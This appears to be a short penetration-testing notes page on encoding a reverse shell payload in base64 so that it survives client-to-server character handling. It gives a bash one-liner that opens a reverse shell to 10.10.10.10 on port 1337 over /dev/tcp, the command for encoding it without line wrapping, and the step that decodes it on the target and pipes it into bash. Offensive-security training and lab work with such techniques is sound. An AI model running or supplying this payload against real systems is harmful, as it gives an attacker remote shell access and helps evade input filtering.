# Encoded Shell Spawning

Sometimes using some [[Shell-Spawning]] tool is not enough either how characters are handled at any point clientside to serverside require encoding to be decoded back to execuatable form. The only assumption made is the the attacker machine is some Linux distro with default binaries and a encoding binary installed.

## Base64

Covert to base64 with 0 column wrapping to prevent multi-line base64 string
```bash
# Create payload
echo "/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/1337 <&1'" | base64 -w0
# -w0 means wrap 0 columns 
```

Decode Payload on target machine:

Linux
```bash
echo "$base64EncodedString" | base64 -d | bash
```
